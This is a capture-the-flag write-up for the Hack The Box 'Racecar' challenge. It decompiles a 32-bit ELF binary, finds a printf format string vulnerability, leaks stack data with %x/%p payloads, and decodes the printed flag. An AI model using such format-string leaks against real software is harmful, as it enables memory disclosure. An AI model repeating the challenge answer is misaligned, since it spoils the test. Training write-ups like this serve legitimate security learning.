# TITLE_HERacecarRE

> IP: [83.136.252.214:53416]
> Downloadable_Files: [racecar.zip]
> PASS: hackthbox
> DESCRIPTION: "Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!"

## NOTES / STEPS

1. Deploy Machine
2. Download files
3. Unzip
   1. > unzip racecar.zip
      1. racecar
4. FILE ENUMERATION
   1. > file racecar
      1. racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
      2. So this is a binary we probably will need ghidra
   2. > strings racecar

        ```text
            [1;33m
            [1;36m
            [1;32m
            [1;31m
            [1;34m
            [1;35m
            %s      ______                                       %s|xxx|
            %s     /|_||_\`.__                                   %s| F |
            %s    (   _    _ _\                                  %s|xxx|
            %s*** =`-(_)--(_)-'                                  %s| I |
                                                            %s|xxx|
                                                            %s| N |
                                                            %s| I |
            %s             _-_-  _/\______\__                    %s| S |
            %s           _-_-__ / ,-. -|-  ,-.`-.                %s|xxx|
            %s            _-_- `( o )----( o )-'                 %s| H |
            %s                   `-'      `-'                    %s|xxx|
            Select race:
            1. Highway battle
            2. Circuit
            %s[-] Invalid choice!%s
            Select car:
            [*] Waiting for the race to finish...
            [+] You won the race!! You get 100 coins!
            [+] Current coins: [%d]%s
            [!] Do you have anything to say to the press after your big victory?
            > %s
            flag.txt
            %s[-] Could not open flag.txt. Please contact the creator.
            [3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
            [-] You lost the race and all your coins!
            %sInsert your data:
            Name: 
            Nickname: 
            %s[+] Welcome [%s%s%s]!
            %s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!
            [*] Current coins: [%d]
            Car #1 stats:   
            [Speed]:        %s
            [Acceleration]: %s
            [Handling]:     %s
            Car #2 stats:   
            [Speed]:        %s
            [Acceleration]: %s
            [Handling]:     %s
            1. Car info
            2. Car selection
        ```

        1. We see a bunch of text that looks to be the prompt when running the binary
5. RUN THE PROGRAM
   1. > ./racecar
      1. In here we are prompted for our name
      2. Then we can pick
         1. Car Info
         2. Car Selection
      3. Selecting the car info we see stats on the two cars
      4. Selecting the car selection we are promted to pick a car (either 1 or 2)
         1. Selecting car 1
            1. We then are asked if we want to race on
               1. Highway Battle
               2. Circut
         2. Selecting car 2
            1. We are then asked if we want to race on
               1. Highway Battle
               2. Circut
   2. THE OUTCOME
      1. When we use car 1 and track 1 -> we lose
      2. When we use car 1 and track 2 -> we win
      3. When we use car 2 and track 1 -> we win
      4. When we use car 2 and track 2 -> we lose
      5. I am guessing this has to do with the whole pallendrome (racecar forward and backwards) but lets look at the code just to be safe
6. GHIDRA
   1. IMPORT -> ANALYZE
   2. MAIN()

        ```c
            void main(void)

            {
            int iVar1;
            int iVar2;
            int in_GS_OFFSET;
            
            iVar1 = *(int *)(in_GS_OFFSET + 0x14);
            setup();
            banner();
            info();
            while (check != 0) {
                iVar2 = menu();
                if (iVar2 == 1) {
                car_info();
                }
                else if (iVar2 == 2) {
                check = 0;
                car_menu();
                }
                else {
                printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
                }
            }
            if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                __stack_chk_fail_local();
            }
            return;
            }
        ```

        1. In here we see the setup(), the banner(), and info() functions
        2. It then checks for if you select 1 or 2 and run the corresponding functions (car_info() or car_menu())
   3. CAR_MENU()

        ```c
            void car_menu(void)

            {
            int iVar1;
            int iVar2;
            uint __seed;
            int iVar3;
            size_t sVar4;
            char *__format;
            FILE *__stream;
            int in_GS_OFFSET;
            undefined *puVar5;
            undefined4 uVar6;
            undefined4 uVar7;
            uint local_54;
            char local_3c [44];
            int local_10;
            
            local_10 = *(int *)(in_GS_OFFSET + 0x14);
            uVar6 = 0xffffffff;
            uVar7 = 0xffffffff;
            do {
                printf(&DAT_00011948);
                iVar1 = read_int(uVar6,uVar7);
                if ((iVar1 != 2) && (iVar1 != 1)) {
                printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
                }
            } while ((iVar1 != 2) && (iVar1 != 1));
            iVar2 = race_type();
            __seed = time((time_t *)0x0);
            srand(__seed);
            if (((iVar1 == 1) && (iVar2 == 2)) || ((iVar1 == 2 && (iVar2 == 2)))) {
                iVar2 = rand();
                iVar2 = iVar2 % 10;
                iVar3 = rand();
                iVar3 = iVar3 % 100;
            }
            else if (((iVar1 == 1) && (iVar2 == 1)) || ((iVar1 == 2 && (iVar2 == 1)))) {
                iVar2 = rand();
                iVar2 = iVar2 % 100;
                iVar3 = rand();
                iVar3 = iVar3 % 10;
            }
            else {
                iVar2 = rand();
                iVar2 = iVar2 % 100;
                iVar3 = rand();
                iVar3 = iVar3 % 100;
            }
            local_54 = 0;
            while( true ) {
                sVar4 = strlen("\n[*] Waiting for the race to finish...");
                if (sVar4 <= local_54) break;
                putchar((int)"\n[*] Waiting for the race to finish..."[local_54]);
                if ("\n[*] Waiting for the race to finish..."[local_54] == '.') {
                sleep(0);
                }
                local_54 = local_54 + 1;
            }
            if (((iVar1 == 1) && (iVar2 < iVar3)) || ((iVar1 == 2 && (iVar3 < iVar2)))) {
                printf("%s\n\n[+] You won the race!! You get 100 coins!\n",&DAT_00011540);
                coins = coins + 100;
                puVar5 = &DAT_00011538;
                printf("[+] Current coins: [%d]%s\n",coins,&DAT_00011538);
                printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s",
                    &DAT_000119de);
                __format = (char *)malloc(0x171);
                __stream = fopen("flag.txt","r");
                if (__stream == (FILE *)0x0) {
                printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5);
                                /* WARNING: Subroutine does not return */
                exit(0x69);
                }
                fgets(local_3c,0x2c,__stream);
                read(0,__format,0x170);
                puts(
                    "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1b[0m"
                    );
                printf(__format);
            }
            else if (((iVar1 == 1) && (iVar3 < iVar2)) || ((iVar1 == 2 && (iVar2 < iVar3)))) {
                printf("%s\n\n[-] You lost the race and all your coins!\n",&DAT_00011548);
                coins = 0;
                printf("[+] Current coins: [%d]%s\n",0,&DAT_00011538);
            }
            if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                __stack_chk_fail_local();
            }
            return;
            }
        ```

        1. Looking through the code we see printf(__format); -> this means it has a format string vulnerability
7. EXPLOIT
   1. So lets get through the race, and when it asks us for our input lets try something that isn't a normal string
      1. > %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
      2. RESPONSE: 576d21c0 170 56576d85 1 36 26 1 2 5657796c 576d21c0 576d2340 7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368
      3. This is good, we are leaking data - however we don't know where it starts / ends 
   2. Create our own flag.txt that is all A's - this should come through as 0x41........ as many A's we put in
   3. Run this on our local copy
      1. INPUT: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
      2. RSEPONSE: 575d3200 170 56586d85 7 43 26 1 2 5658796c 575d3200 575d3380 41414141 41414141 41414141 41414141 56587d00 56589f8c ffad40d8 5658738d 56587540
         1. BINGO! So we can see that the 12th spot is where we KNOW it is the start
   4. So now lets just flood it with 11 %x's and start at the 12th position and then a bunch of %p and see what we get
      1. INPUT: %x %x %x %x %x %x %x %x %x %x %x %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
      2. OUTPUT: 569381c0 170 5664ed85 9 36 26 1 2 5664f96c 569381c0 56938340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0xdbf5b200 0xf7fb43fc 0x56651f8c 0xff957b88 0x5664f441 0x1 0xff957c34 0xff957c3c 0xdbf5b200 0xff957ba0
8. CONVERT
   1. Now we have the hex characters we need to convert these values into ascii characters
   2. CYBERCHEF
      1. FROM HEX
         1. We get: "@{BTH_yhw_d1d4s_1t_3vf_3h_g4lt_n05_3hkc4t}!?" which looks to be the flag just reversed
         2. FLAG: `HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}`

## QUESTIONS

1. FLAG: `HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}`
